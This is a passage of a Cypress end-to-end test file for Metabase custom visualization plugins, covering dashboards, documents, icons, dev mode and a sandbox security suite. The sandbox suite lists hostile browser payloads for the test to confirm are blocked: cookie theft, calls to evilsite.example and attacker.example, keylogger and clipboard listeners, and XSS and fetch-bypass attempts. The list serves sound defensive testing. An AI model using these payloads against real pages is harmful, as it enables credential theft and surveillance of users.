                  visualization_settings: {
                    click_behavior: {
                      parameterMapping: {},
                      targetId: targetDashboardId,
                      linkType: "dashboard",
                      type: "link",
                    },
                  },
                },
              ],
            });
            H.visitDashboard(dashcard.dashboard_id);
          });

          cy.log("Open a URL");
          const anchorClick = cy.stub();
          H.onNextAnchorClick((anchor: HTMLAnchorElement) =>
            anchorClick(anchor.href),
          );
          H.getDashboardCard(0).findByTestId("demo-viz-click-target").click();
          cy.wrap(anchorClick).should(
            "have.been.calledOnceWith",
            "https://metabase.test/custom-viz",
          );

          cy.log("Update a dashboard filter");
          H.getDashboardCard(1)
            .findByText(/Value: \d+/)
            .should("be.visible");
          H.getDashboardCard(1).findByTestId("demo-viz-click-target").click();
          // The crossfilter behavior sets the dashboard parameter to the value
          // of the clicked column.
          cy.location("search").should(
            "include",
            `${parameter.slug}=${AGGREGATED_VALUE}`,
          );

          cy.log("Navigate to a saved question");
          H.getDashboardCard(2).findByTestId("demo-viz-click-target").click();
          cy.location("pathname").should(
            "match",
            new RegExp(`^/question/${targetQuestionId}(?:-|$)`),
          );

          cy.go("back");

          cy.log("Navigate to another dashboard");
          H.getDashboardCard(3)
            .findByText("Custom viz rendered successfully")
            .should("be.visible");
          H.getDashboardCard(3).findByTestId("demo-viz-click-target").click();
          cy.location("pathname").should(
            "match",
            new RegExp(`^/dashboard/${targetDashboardId}(?:-|$)`),
          );
        });
      });
    });
  });

  describe("using a plugin — documents", () => {
    const DOC_QUESTION_NAME = "Custom Viz Doc Question";

    beforeEach(() => {
      H.activateToken("bleeding-edge");
      H.updateSetting("csp-img-enabled", true);
      H.updateSetting("custom-viz-enabled", true);
      H.addCustomVizPlugin(H.CUSTOM_VIZ_FIXTURE_TGZ);

      H.createQuestion(
        {
          name: DOC_QUESTION_NAME,
          query: {
            "source-table": SAMPLE_DB_TABLES.STATIC_ORDERS_ID,
            aggregation: [["count"]],
          },
          display: H.CUSTOM_VIZ_DISPLAY,
        },
        { wrapId: true, idAlias: "questionId" },
      );
    });

    describe("regular documents", () => {
      beforeEach(() => {
        cy.get<CardId>("@questionId").then((cardId) => {
          H.createDocument({
            name: "Doc with Custom Viz",
            document: buildDocumentWithCustomVizCard(cardId),
            collection_id: null,
            idAlias: "documentId",
          });
        });
      });

      it("falls back to the default visualization when the plugin bundle fails to load, then renders the custom viz when the document is opened again", () => {
        const bundleMatcher = {
          method: "GET",
          pathname: "/api/ee/custom-viz-plugin/*/bundle",
        };

        cy.intercept(bundleMatcher, {
          statusCode: 500,
          body: "boom",
        }).as("failedBundle");

        H.visitDocument("@documentId");
        cy.wait("@failedBundle");

        H.getDocumentCard(DOC_QUESTION_NAME).within(() => {
          cy.findByTestId("table-root").should("be.visible");
          cy.findByText("Custom viz rendered successfully").should("not.exist");
        });

        cy.intercept(bundleMatcher, (req) => req.continue()).as(
          "bundleRestored",
        );
        cy.reload();
        cy.wait("@bundleRestored");

        H.getDocumentCard(DOC_QUESTION_NAME).within(() => {
          cy.findByText("Custom viz rendered successfully").should(
            "be.visible",
          );
          cy.findByText(/Value: \d+/).should("be.visible");
        });
      });
    });

    describe("inserting via / command", () => {
      beforeEach(() => {
        // Query the card once so it appears in the /chart command's recent list.
        cy.get<CardId>("@questionId").then((cardId) => {
          cy.request("POST", `/api/card/${cardId}/query`);
        });

        H.createDocument({
          name: "Empty Doc",
          document: {
            type: "doc",
            content: [{ type: "paragraph", attrs: { _id: "1" } }],
          },
          collection_id: null,
          idAlias: "documentId",
        });
      });

      it("renders the custom viz when added via the /chart command", () => {
        H.interceptPluginBundle();
        H.visitDocument("@documentId");

        H.documentContent().click();
        H.addToDocument("/", false);
        H.commandSuggestionItem("Chart").click();
        H.commandSuggestionDialog().findByText(DOC_QUESTION_NAME).click();

        cy.wait("@pluginBundle");

        H.getDocumentCard(DOC_QUESTION_NAME)
          .findByText("Custom viz rendered successfully")
          .should("be.visible");
      });
    });

    describe("public sharing", () => {
      beforeEach(() => {
        H.updateSetting("enable-public-sharing", true);

        cy.get<CardId>("@questionId").then((cardId) => {
          H.createDocument({
            name: "Public Doc with Custom Viz",
            document: buildDocumentWithCustomVizCard(cardId),
            collection_id: null,
            idAlias: "documentId",
          });
        });
      });

      it("falls back to the default viz on a public document", () => {
        H.visitPublicDocument("@documentId");

        H.getDocumentCard(DOC_QUESTION_NAME)
          .findByTestId("table-root")
          .should("be.visible");
      });
    });
  });

  describe("icon rendering across the app", () => {
    const ICON_QUESTION_NAME = "Custom Viz Icon Test";
    const UNPINNED_QUESTION_NAME = "Custom Viz Icon Test — List";
    const DASHBOARD_NAME = "Custom Viz Icon Dashboard";
    const DOC_NAME = "Custom Viz Icon Document";
    // EntityIcon renders as a CSS-masked span whose `mask-image: url(...)`
    // points at /api/ee/custom-viz-plugin/:id/asset?path=icon.svg. Matching on
    // that URL fragment is the most stable signal that the plugin icon is
    // actually rendered — some consumers pass `alt` (accessible name) while
    // others render the icon as decorative/aria-hidden.
    const PLUGIN_ICON_SELECTOR = 'span[style*="custom-viz-plugin"]';

    beforeEach(() => {
      H.activateToken("bleeding-edge");
      H.updateSetting("csp-img-enabled", true);
      H.updateSetting("custom-viz-enabled", true);
      H.addCustomVizPlugin(H.CUSTOM_VIZ_FIXTURE_TGZ);

      // Main question: pinned, so the static pinned card shows the plugin
      // icon. Also bookmarked, queried (for recents), and embedded in a
      // document below.
      H.createQuestion(
        {
          name: ICON_QUESTION_NAME,
          query: {
            "source-table": SAMPLE_DB_TABLES.STATIC_ORDERS_ID,
            aggregation: [["count"]],
          },
          display: H.CUSTOM_VIZ_DISPLAY,
        },
        { wrapId: true, idAlias: "questionId" },
      );

      cy.get<CardId>("@questionId").then((cardId) => {
        cy.request("PUT", `/api/card/${cardId}`, {
          collection_position: 1,
        });
        cy.request("POST", `/api/card/${cardId}/query`);
        cy.request("POST", `/api/bookmark/card/${cardId}`);
      });

      // Secondary unpinned question — used to assert the icon on a regular
      // (non-pinned) collection list row.
      H.createQuestion({
        name: UNPINNED_QUESTION_NAME,
        query: {
          "source-table": SAMPLE_DB_TABLES.STATIC_ORDERS_ID,
          aggregation: [["count"]],
        },
        display: H.CUSTOM_VIZ_DISPLAY,
      });

      H.createDashboard(
        { name: DASHBOARD_NAME },
        { wrapId: true, idAlias: "dashboardId" },
      );
      cy.get<DashboardId>("@dashboardId").then((dashboardId) => {
        cy.request("POST", `/api/bookmark/dashboard/${dashboardId}`);
      });

      cy.get<CardId>("@questionId").then((cardId) => {
        H.createDocument({
          name: DOC_NAME,
          document: buildDocumentWithCustomVizCard(cardId),
          collection_id: null,
          idAlias: "documentId",
        });
      });
      cy.get("@documentId").then((documentId) => {
        cy.request("POST", `/api/bookmark/document/${documentId}`);
      });
    });

    it("renders the custom-viz icon across app surfaces when navigating through the UI", () => {
      H.interceptPluginBundle();

      cy.visit("/collection/root");

      cy.log("Navigation sidebar bookmark");
      H.navigationSidebar()
        .findByRole("link", { name: new RegExp(ICON_QUESTION_NAME) })
        .find(PLUGIN_ICON_SELECTOR)
        .should("exist");

      cy.log("Unpinned collection list row");
      cy.findByRole("row", { name: new RegExp(UNPINNED_QUESTION_NAME) })
        .find(PLUGIN_ICON_SELECTOR)
        .should("exist");

      cy.log("Pinned section shows the plugin icon on the static card");
      H.getPinnedSection().find(PLUGIN_ICON_SELECTOR).should("exist");

      cy.log("Navigate → question editor by clicking the pinned card title");
      H.getPinnedSection().findByText(ICON_QUESTION_NAME).click();
      cy.wait("@pluginBundle");

      cy.log("Chart type sidebar on the question editor");
      H.openVizTypeSidebar();
      H.vizTypeSidebar()
        .findByRole("img", { name: "demo-viz" })
        .should("be.visible");
      H.openVizTypeSidebar();

      cy.log("Command palette option row");
      H.commandPaletteSearch(ICON_QUESTION_NAME, false);
      H.commandPalette()
        .findAllByRole("option", { name: new RegExp(ICON_QUESTION_NAME) })
        .first()
        .find(PLUGIN_ICON_SELECTOR)
        .should("be.visible");

      cy.log(
        'Search results page — reached by clicking "View and filter all …"',
      );
      H.commandPalette()
        .findByText(/View and filter all .* results/)
        .click();
      cy.findAllByTestId("search-result-item")
        .filter(`:contains(${ICON_QUESTION_NAME})`)
        .first()
        .find(PLUGIN_ICON_SELECTOR)
        .should("exist");

      cy.log('Navigate → home via the nav-sidebar "Home" link');
      H.openNavigationSidebar();
      H.navigationSidebar().findByText("Home").click();

      cy.log("Home recently-viewed section");
      cy.findByTestId("recent-items-section")
        .findByRole("link", { name: new RegExp(ICON_QUESTION_NAME) })
        .find(PLUGIN_ICON_SELECTOR)
        .should("exist");

      cy.log("Entity picker data-source modal, reached via New → Question");
      H.newButton("Question").click();
      H.miniPickerBrowseAll().click();
      H.entityPickerModal().within(() => {
        H.entityPickerModalItem(0, "Our analytics").click();
        H.entityPickerModalItem(1, ICON_QUESTION_NAME)
          .find(PLUGIN_ICON_SELECTOR)
          .should("exist");
      });
      cy.realPress("Escape");
      H.entityPickerModal().should("not.exist");

      cy.log("Navigate → dashboard via bookmark link in the nav sidebar");
      H.openNavigationSidebar();
      H.navigationSidebar()
        .findByRole("link", { name: new RegExp(DASHBOARD_NAME) })
        .click();

      cy.log("Dashboard add-questions sidesheet");
      H.editDashboard();
      H.openQuestionsSidebar();
      cy.findByTestId("add-card-sidebar")
        .findByRole("menuitem", { name: ICON_QUESTION_NAME })
        .find(PLUGIN_ICON_SELECTOR)
        .should("exist");

      // Exit edit mode so the next click-to-navigate isn't blocked by an
      // unsaved-changes prompt.
      cy.findByRole("button", { name: /Cancel/i }).click();

      cy.log("Navigate → document via bookmark link");
      H.openNavigationSidebar();
      H.navigationSidebar()
        .findByRole("link", { name: new RegExp(DOC_NAME) })
        .click();

      cy.log("Document mention dialog (@ suggestions)");
      // By the time we reach this step the plugin list has already been
      // fetched for the embedded card, so no need to wait on it again.
      // Click into the intro paragraph — clicking blindly on document-content
      // may land on the embedded card.
      H.documentContent().findByText("Custom viz embedded below:").click();
      cy.realPress("End");
      cy.realType(" @");
      H.documentMentionDialog().should("be.visible");
      cy.realType("Custom");
      // Both the pinned and the unpinned questions appear — assert the icon
      // renders on every matching option.
      H.documentMentionDialog()
        .findAllByRole("option", { name: new RegExp(ICON_QUESTION_NAME) })
        .should("have.length.at.least", 2)
        .each(($option) => {
          cy.wrap($option).find(PLUGIN_ICON_SELECTOR).should("exist");
        });
      cy.realPress("Escape");

      cy.log('Document "Visualize as" panel on the embedded card');
      H.openDocumentCardMenu(ICON_QUESTION_NAME);
      H.popover().findByText("Edit Visualization").click();
      H.getDocumentSidebar()
        .findByRole("button", { name: /demo-viz/i })
        .click();
      cy.findByRole("menu")
        .findByRole("menuitem", { name: /demo-viz/i })
        .find(PLUGIN_ICON_SELECTOR)
        .should("exist");
    });
  });

  describe("development mode", () => {
    const CUSTOM_VIZ_DEV_PROJECT_NAME = "custom-viz-dev-plugin";
    const CUSTOM_VIZ_DEV_PORT = 5174;
    const TIMEOUT = 120000;
    const tmpDir = `${Cypress.config("projectRoot")}/e2e/tmp`;
    const sdkDir = `${Cypress.config("projectRoot")}/enterprise/frontend/src/custom-viz`;
    const cliPath = `${sdkDir}/dist/cli.js`;
    const projectDir = `${tmpDir}/${CUSTOM_VIZ_DEV_PROJECT_NAME}`;
    const devUrl = `http://localhost:${CUSTOM_VIZ_DEV_PORT}`;
    const pluginSrcPath = `${projectDir}/src/index.tsx`;
    const QUESTION_NAME = "Custom Viz Dev Mode Question Test";
    let devServerPid: number | null = null;

    beforeEach(() => {
      H.activateToken("bleeding-edge");
      H.updateSetting("csp-img-enabled", true);
      H.updateSetting("custom-viz-enabled", true);

      // The SDK build lives in `beforeEach` rather than `before` on purpose:
      // Cypress never retries a failed `before all` hook, so a slow install
      // there fails the whole suite with no second attempt.
      cy.log("Build the SDK so we can use the repo-local CLI");
      cy.exec(`mkdir -p ${tmpDir}`);
      cy.exec(
        `cd "${sdkDir}" && bun install --frozen-lockfile && bun run build`,
        {
          timeout: TIMEOUT,
        },
      );

      cy.exec(`rm -rf "${projectDir}"`, { timeout: TIMEOUT });
      cy.exec(
        `cd "${tmpDir}" && node "${cliPath}" init "${CUSTOM_VIZ_DEV_PROJECT_NAME}"`,
        {
          timeout: TIMEOUT,
        },
      );

      // Use current version of the SDK in the plugin.
      cy.readFile(`${projectDir}/package.json`).then((pkg) => {
        cy.writeFile(
          `${projectDir}/package.json`,
          JSON.stringify(
            {
              ...pkg,
              devDependencies: {
                ...(pkg?.devDependencies ?? {}),
                "@metabase/custom-viz": `file:${sdkDir}`,
              },
            },
            null,
            2,
          ),
        );
      });

      cy.exec(`cd "${projectDir}" && bun install`, { timeout: TIMEOUT });

      cy.task<{ pid: number }>("startCustomVizDevServer", {
        cwd: projectDir,
      }).then(({ pid }) => {
        devServerPid = pid;
      });
    });

    afterEach(() => {
      if (devServerPid != null) {
        cy.task("stopCustomVizDevServer", devServerPid);
        devServerPid = null;
      }
    });

    it("should load a dev-only plugin from a local dev server URL and use it in a question", () => {
      H.visitCustomVizDevelopment();

      cy.log("Dev server URL is pre-filled with the default value");
      cy.findByLabelText(/Dev server URL/).should("have.value", devUrl);
      cy.findByRole("button", { name: /Enable/ })
        .should("be.enabled")
        .click();

      cy.log("Verify the dev plugin is registered.");
      H.main().findByText(CUSTOM_VIZ_DEV_PROJECT_NAME).should("be.visible");

      // Use the dev plugin in a question (Count of Orders) — this yields a
      // single numeric value so the scaffolded plugin renders.
      H.createQuestion(
        {
          name: "Custom Viz Dev Mode Question Test",
          query: {
            "source-table": SAMPLE_DB_TABLES.STATIC_ORDERS_ID,
            aggregation: [["count"]],
          },
          display: "table",
        },
        { visitQuestion: true },
      );

      cy.findByTestId("viz-type-button").click();
      cy.findByTestId("custom-viz-plugins-toggle").click();
      cy.log("Checking if dev badge is visible");
      cy.findByLabelText(
        "This is a development version of the visualization",
      ).should("exist");
      cy.findByTestId(`${CUSTOM_VIZ_DEV_PROJECT_NAME}-button`).click();

      // Close the picker so the viz is visible.
      cy.findByTestId("viz-type-button").click();

      cy.log(
        "Threshold defaults to 0 and Count(Orders) is > 0, so the thumbs-up should render.",
      );
      H.main()
        .findByRole("img", { name: "Above threshold" })
        .should("be.visible");

      cy.log("Modifying plugin source to change the rendered label");
      cy.readFile(pluginSrcPath).then((src) => {
        const updated = src.replace('"Above threshold"', '"Way above!"');
        if (updated === src) {
          throw new Error(
            `Expected to replace "Above threshold" in ${pluginSrcPath}`,
          );
        }
        cy.writeFile(pluginSrcPath, updated);
      });

      cy.log("Checking if hot reload works");
      H.main().findByRole("img", { name: "Way above!" }).should("be.visible");

      cy.log("Verify plugin settings affect rendering.");
      cy.log(
        "Set threshold higher than Count(Orders) so it flips to thumbs-down.",
      );
      cy.findByTestId("viz-settings-button").click();
      cy.findByTestId("chartsettings-sidebar")
        .findByPlaceholderText("Set threshold")
        .clear()
        .type("100000");
      cy.findByRole("button", {
        name: /Done/,
      }).click();
      H.main()
        .findByRole("img", { name: "Below threshold" })
        .should("be.visible");

      cy.log(
        "Saving the question and reloading to verify persistence of settings and dev URL",
      );
      cy.log("handling modal");
      H.saveQuestion(QUESTION_NAME, { shouldReplaceOriginalQuestion: true });
      // Wait for the dialog to close
      cy.findByRole("dialog", { name: /Save question/ }).should("not.exist");
      cy.reload();
      H.main()
        .findByRole("img", { name: "Below threshold" })
        .should("be.visible");

      cy.log(
        "When the dev server is stopped, the visualization should revert to the default",
      );
      cy.task("stopCustomVizDevServer", devServerPid).then(() => {
        devServerPid = null;
      });
      cy.reload();
      H.main().findByText("18,760", { timeout: 15000 }).should("be.visible");
    });
  });
});

describe("sandbox", () => {
  beforeEach(() => {
    H.restore();
    cy.signInAsAdmin();
    H.activateToken("bleeding-edge");
    H.updateSetting("csp-img-enabled", true);
    H.updateSetting("custom-viz-enabled", true);
    H.addCustomVizPlugin(H.CUSTOM_VIZ_FIXTURE_TGZ);
    H.createQuestion(
      {
        name: "Custom Viz Sandbox Test",
        query: {
          "source-table": SAMPLE_DB_TABLES.STATIC_ORDERS_ID,
          aggregation: [["count"]],
        },
        display: H.CUSTOM_VIZ_DISPLAY,
      },
      { wrapId: true, idAlias: "sandboxCardId" },
    );
  });

  const blockedPattern = (suffix: RegExp) =>
    new RegExp(String.raw`\[plugin \d+\] blocked ${suffix.source}`);

  const SANDBOX_CASES: Array<{
    name: string;
    payload: string;
    errorPattern: RegExp;
  }> = [
    {
      name: "window.fetch",
      payload: 'window.fetch("/api/canary-should-be-blocked-by-sandbox");',
      errorPattern: blockedPattern(/API call: window\.fetch/),
    },
    {
      name: "document.open",
      payload: 'document.open("https://evilsite.example");',
      errorPattern: blockedPattern(/API call: Document\.open/),
    },
    {
      name: "document.cookie getter",
      payload: "var stolen = document.cookie;",
      errorPattern: blockedPattern(/API call: Document\.get cookie/),
    },
    {
      name: "window.cookieStore getter",
      payload: "var x = window.cookieStore;",
      errorPattern: blockedPattern(/API call: Window\.get cookieStore/),
    },
    {
      name: "StorageEvent.newValue getter",
      payload:
        'var e = new StorageEvent("storage", { newValue: "secret" }); var x = e.newValue;',
      errorPattern: blockedPattern(/API call: StorageEvent\.get newValue/),
    },
    {
      // document-level keydown listener is a global keylogger — captures
      // every keystroke the user types anywhere on the host page.
      name: 'document.addEventListener("keydown")',
      payload: 'document.addEventListener("keydown", function(){}, true);',
      errorPattern: blockedPattern(
        /addEventListener for global event type: keydown/,
      ),
    },
    {
      // Same threat class — clipboard sniffer.
      name: 'document.addEventListener("paste")',
      payload: 'document.addEventListener("paste", function(){}, true);',
      errorPattern: blockedPattern(
        /addEventListener for global event type: paste/,
      ),
    },
    {
      // Refusing the listener also closes the metadata leak ("host wrote
      // to localStorage") on top of the StorageEvent accessor blocks.
      name: 'window.addEventListener("storage")',
      payload: 'window.addEventListener("storage", function(){});',
      errorPattern: blockedPattern(
        /addEventListener for global event type: storage/,
      ),
    },
    {
      // The `on*` IDL setters reach the same global event types as
      // addEventListener, so they are gated on the property path too.
      name: "document.onkeydown setter",
      payload: "document.onkeydown = function () {};",
      errorPattern: blockedPattern(/API call: Document\.set onkeydown/),
    },
    {
      name: "document.onpaste setter",
      payload: "document.onpaste = function () {};",
      errorPattern: blockedPattern(/API call: Document\.set onpaste/),
    },
    {
      name: "window.onstorage setter",
      payload: "window.onstorage = function () {};",
      errorPattern: blockedPattern(/API call: window\.set onstorage/),
    },
    {
      name: "window.onkeydown setter",
      payload: "window.onkeydown = function () {};",
      errorPattern: blockedPattern(/API call: window\.set onkeydown/),
    },
    {
      name: "document.body.onstorage setter",
      payload: "document.body.onstorage = function () {};",
      errorPattern: blockedPattern(/API call: HTMLBodyElement\.set onstorage/),
    },
    {
      name: "detached body.onstorage setter",
      payload: 'document.createElement("body").onstorage = function () {};',
      errorPattern: blockedPattern(/API call: HTMLBodyElement\.set onstorage/),
    },
    {
      name: "detached frameset.onstorage setter",
      payload: 'document.createElement("frameset").onstorage = function () {};',
      errorPattern: blockedPattern(
        /API call: HTMLFrameSetElement\.set onstorage/,
      ),
    },
    {
      name: 'setAttribute("onclick", ...)',
      payload: 'document.body.setAttribute("onclick", "alert(1)");',
      errorPattern: blockedPattern(
        /setAttribute for inline event handler: onclick/,
      ),
    },
    {
      name: "navigator.clipboard",
      payload: "var c = navigator.clipboard;",
      errorPattern: blockedPattern(/API call: Navigator\.get clipboard/),
    },
    {
      // Hits createElementDistortion's BLOCKED_TAGS — different code path
      // and different error format ("blocked createElement: <tag>") from
      // the API-call cases above.
      name: 'createElement("script")',
      payload: 'document.createElement("script");',
      errorPattern: blockedPattern(/createElement: script/),
    },
    {
      name: 'createElement("a")',
      payload: 'document.createElement("a");',
      errorPattern: blockedPattern(/createElement: a/),
    },
    {
      name: 'createElement("style")',
      payload: 'document.createElement("style");',
      errorPattern: blockedPattern(/createElement: style/),
    },
    {
      name: 'createElement("area")',
      payload: 'document.createElement("area");',
      errorPattern: blockedPattern(/createElement: area/),
    },
    {
      // Media elements load URLs via `src` / `srcset` — exfil GETs.
      name: 'createElement("video")',
      payload: 'document.createElement("video");',
      errorPattern: blockedPattern(/createElement: video/),
    },
    {
      // <input type="image"> fires a GET to src on render; the broader
      // <input> block also covers phishing UI.
      name: 'createElement("input")',
      payload: 'document.createElement("input");',
      errorPattern: blockedPattern(/createElement: input/),
    },
    {
      name: 'createElementNS(SVG, "use")',
      payload: 'document.createElementNS("http://www.w3.org/2000/svg", "use");',
      errorPattern: blockedPattern(/createElementNS: use/),
    },
    // `eval` / `new Function(...)` Near membrane allows these in the sandbox, but
    // it still catches anything they evaluate (e.g. `eval('window.fetch(...)')` triggers the fetch
    // distortion), so it's not an escape — just not blocked at access.
    {
      name: "eval-evaluated fetch",
      payload:
        "eval('window.fetch(\"/api/canary-should-be-blocked-by-sandbox\")');",
      errorPattern: blockedPattern(/API call: window\.fetch/),
    },
    {
      name: "XMLHttpRequest",
      payload: "new XMLHttpRequest();",
      errorPattern: blockedPattern(/API call: window\.XMLHttpRequest/),
    },
    {
      name: "document.cookie setter",
      payload: 'document.cookie = "${document.cookie}stolen=1;";',
      errorPattern: blockedPattern(/API call: Document\.set cookie/),
    },
    {
      name: "window.open",
      payload: 'window.open("/api/canary-should-be-blocked-by-sandbox");',
      errorPattern: blockedPattern(/API call: window\.open/),
    },
    {
      name: "document.write",
      payload: 'document.write("<p>injected</p>");',
      errorPattern: blockedPattern(/API call: Document\.write/),
    },
    {
      name: 'setAttribute("onerror", ...)',
      payload: 'document.body.setAttribute("onerror", "alert(1)");',
      errorPattern: blockedPattern(
        /setAttribute for inline event handler: onerror/,
      ),
    },
    {
      name: 'setAttribute("href", "javascript:...")',
      payload: 'document.body.setAttribute("href", "javascript:alert(1)");',
      errorPattern: blockedPattern(/setAttribute with javascript: URL: href/),
    },
    {
      // Try to defeat the membrane by binding a non-allowlisted native.
      // Safe because `window.fetch` access already
      // returns a `blocked` function. Binding it produces a bound
      // function that still throws when called.
      name: "window.fetch.bind(window) bypass attempt",
      payload:
        'window.fetch.bind(window)("/api/canary-should-be-blocked-by-sandbox");',
      errorPattern: blockedPattern(/API call: window\.fetch/),
    },
    {
      // Try to bypass via Function.prototype.bind.call. Confirms the check
      // isn't sensitive to which side initiates the bind.
      name: "Function.prototype.bind.call(window.fetch, ...) bypass attempt",
      payload:
        'Function.prototype.bind.call(window.fetch, window)("/api/canary-should-be-blocked-by-sandbox");',
      errorPattern: blockedPattern(/API call: window\.fetch/),
    },
    {
      name: "Worker constructor",
      payload: 'new Worker("data:text/javascript,1");',
      errorPattern: blockedPattern(/API call: window\.Worker/),
    },
    {
      name: "SharedWorker constructor",
      payload: 'new SharedWorker("data:text/javascript,1");',
      errorPattern: blockedPattern(/API call: window\.SharedWorker/),
    },
    {
      name: "RTCPeerConnection constructor",
      payload: "new RTCPeerConnection();",
      errorPattern: blockedPattern(/API call: window\.RTCPeerConnection/),
    },
    {
      name: "WebTransport constructor",
      payload: 'new WebTransport("https://attacker.example/wt");',
      errorPattern: blockedPattern(/API call: WebTransport/),
    },
    {
      name: "BroadcastChannel constructor",
      payload: 'new BroadcastChannel("attacker");',
      errorPattern: blockedPattern(/API call: BroadcastChannel/),
    },
    {
      name: "Range.createContextualFragment",
      payload:
        'document.createRange().createContextualFragment("<img src=x>");',
      errorPattern: blockedPattern(/API call: Range\.createContextualFragment/),
    },
    {
      name: "DOMParser.parseFromString",
      payload: 'new DOMParser().parseFromString("<p>x</p>", "text/html");',
      errorPattern: blockedPattern(/API call: DOMParser\.parseFromString/),
    },
    {
      name: "Element.setHTMLUnsafe",
      payload: 'document.createElement("div").setHTMLUnsafe("<x>");',
      errorPattern: blockedPattern(/API call: Element\.setHTMLUnsafe/),
    },
    {
      name: "Document.parseHTMLUnsafe",
      payload: 'Document.parseHTMLUnsafe("<p>x</p>");',
      errorPattern: blockedPattern(/API call: Document\.parseHTMLUnsafe/),
    },
    {
      name: "XSLTProcessor constructor",
      payload: "new XSLTProcessor();",
      errorPattern: blockedPattern(/API call: XSLTProcessor/),
    },
    {
      name: "window.alert",
      payload: 'window.alert("pwned");',
      errorPattern: blockedPattern(/API call: window\.alert/),
    },
    {
      name: "window.confirm",
      payload: 'window.confirm("pwned");',
      errorPattern: blockedPattern(/API call: window\.confirm/),
    },
    {
      name: "window.prompt",
      payload: 'window.prompt("pwned");',
      errorPattern: blockedPattern(/API call: window\.prompt/),
    },
    {
      name: "window.print",
      payload: "window.print();",
      errorPattern: blockedPattern(/API call: window\.print/),
    },
    {
      name: "Notification constructor",
      payload: 'new Notification("phish");',
      errorPattern: blockedPattern(/API call: window\.Notification/),
    },
    {
      // `.click()` is on HTMLElement.prototype, so any non-blocked element
      // exercises the same membrane path as a synthesized anchor would.
      name: "HTMLElement.click()",
      payload: 'document.createElement("div").click();',
      errorPattern: blockedPattern(/API call: HTMLElement\.click/),
    },
    {
      name: "FontFace.load",
      payload:
        'new FontFace("x", "url(/api/canary-should-be-blocked-by-sandbox)").load();',
      errorPattern: blockedPattern(/API call: FontFace\.load/),
    },
    {
      name: "document.adoptedStyleSheets setter",
      payload: "document.adoptedStyleSheets = [];",
      errorPattern: blockedPattern(
        /API call: Document\.set adoptedStyleSheets/,
      ),
    },
    {
      name: "document.adoptedStyleSheets getter",
      payload: "var x = document.adoptedStyleSheets;",
      errorPattern: blockedPattern(
        /API call: Document\.get adoptedStyleSheets/,
      ),
    },
    {
      name: "ShadowRoot.adoptedStyleSheets setter",
      payload:
        'document.createElement("div").attachShadow({ mode: "open" }).adoptedStyleSheets = [];',
      errorPattern: blockedPattern(
        /API call: ShadowRoot\.set adoptedStyleSheets/,
      ),
    },
    {
      name: "CSSStyleSheet.replaceSync",
      payload: 'new CSSStyleSheet().replaceSync("");',
      errorPattern: blockedPattern(/API call: CSSStyleSheet\.replaceSync/),
    },
    {
      name: "history.state getter",
      payload: "var x = history.state;",
      errorPattern: blockedPattern(/API call: History\.get state/),
    },
    {
      name: "performance.getEntries",
      payload: "performance.getEntries();",
      errorPattern: blockedPattern(/API call: Performance\.getEntries/),
    },
    {
      name: "PerformanceObserver constructor",
      payload: "new PerformanceObserver(function() {});",
      errorPattern: blockedPattern(/API call: PerformanceObserver/),
    },
    {
      name: "document.referrer getter",
      payload: "var x = document.referrer;",
      errorPattern: blockedPattern(/API call: Document\.get referrer/),
    },
    {
      name: "document.URL getter",
      payload: "var x = document.URL;",
      errorPattern: blockedPattern(/API call: Document\.get URL/),
    },
    {
      name: "document.documentURI getter",
      payload: "var x = document.documentURI;",
      errorPattern: blockedPattern(/API call: Document\.get documentURI/),
    },
    {
      name: "document.baseURI getter",
      payload: "var x = document.baseURI;",
      errorPattern: blockedPattern(/API call: Node\.get baseURI/),
    },
    {
      name: "document.designMode setter",
      payload: 'document.designMode = "on";',
      errorPattern: blockedPattern(/API call: Document\.set designMode/),
    },
    {
      name: "element.contentEditable setter",
      payload: 'document.createElement("div").contentEditable = "true";',
      errorPattern: blockedPattern(
        /API call: HTMLElement\.set contentEditable/,
      ),
    },
    {
      name: "HTMLDialogElement.showModal",
      payload: 'document.createElement("dialog").showModal();',
      errorPattern: blockedPattern(/API call: HTMLDialogElement\.showModal/),
    },
    {
      name: "Element.requestFullscreen",
      payload: 'document.createElement("div").requestFullscreen();',
      errorPattern: blockedPattern(/API call: Element\.requestFullscreen/),
    },
    {
      name: "PaymentRequest constructor",
      payload: "new PaymentRequest([], {});",
      errorPattern: blockedPattern(/API call: PaymentRequest/),
    },
    {
      name: "Attr.value setter (onclick handler)",
      payload: `
        var attr = document.createAttribute("onclick");
        attr.value = "alert(1)";
      `,
      errorPattern: blockedPattern(
        /Attr\.set value for inline event handler: onclick/,
      ),
    },
    {
      name: "Attr.value setter (post-hoc javascript: URL)",
      payload: `
        document.body.setAttribute("href", "/safe");
        var attr = document.body.getAttributeNode("href");
        attr.value = "javascript:alert(1)";
      `,
      errorPattern: blockedPattern(
        /Attr\.set value with javascript: URL: href/,
      ),
    },
    {
      name: "ShadowRoot.setHTMLUnsafe",
      payload:
        'document.createElement("div").attachShadow({ mode: "open" }).setHTMLUnsafe("<x>");',
      errorPattern: blockedPattern(/API call: ShadowRoot\.setHTMLUnsafe/),
    },
    {
      // caret*FromPoint is the only non-interaction-gated way to get a raw
      // host Text node; blocked because the Element-level DOM decoy doesn't
      // cover this entry point.
      name: "Document.caretRangeFromPoint",
      payload: "document.caretRangeFromPoint(0, 0);",
      errorPattern: blockedPattern(/API call: Document\.caretRangeFromPoint/),
    },
  ];

  it("blocks browser APIs that are not allowed in the sandbox", () => {
    const bundle = SANDBOX_CASES.map((c, index) => {
      const delay = 1000 + index * 100;
      return `window.setTimeout(function() { try { ${c.payload} } catch (e) { console.error(${JSON.stringify(c.name)}, e); } }, ${delay});`;
    }).join("\n");

    cy.intercept("GET", "/api/canary-should-be-blocked-by-sandbox").as(
      "canary",
    );

    cy.intercept("GET", "/api/ee/custom-viz-plugin/*/bundle*", (req) => {
      req.continue((res) => {
        res.body = `console.log("injected bundle");${bundle}\n${String(res.body)};\n`;
        res.send();
      });
    }).as("injectedBundle");
    H.visitQuestion("@sandboxCardId", {
      onBeforeLoad(win) {
        cy.spy(win.console, "log").as("consoleLog");
        cy.spy(win.console, "error").as("consoleError");
      },
    });
    cy.wait("@injectedBundle");
    cy.get("@consoleLog").should("be.calledWith", "injected bundle");

    for (const { name, errorPattern } of SANDBOX_CASES) {
      cy.log(`Verifying error pattern for: ${name}`);
      cy.get("@consoleError").should(
        "have.been.calledWith",
        name,
        Cypress.sinon.match.has("message", Cypress.sinon.match(errorPattern)),
      );
    }
    cy.get("@canary.all").should("have.length", 0);
  });

  // `window.location` and the Location attributes are `[LegacyUnforgeable]`,
  // and `near-membrane-dom` gives the plugin its own iframe realm with its
  // own Location instance, so we can't intercept these at the membrane (see
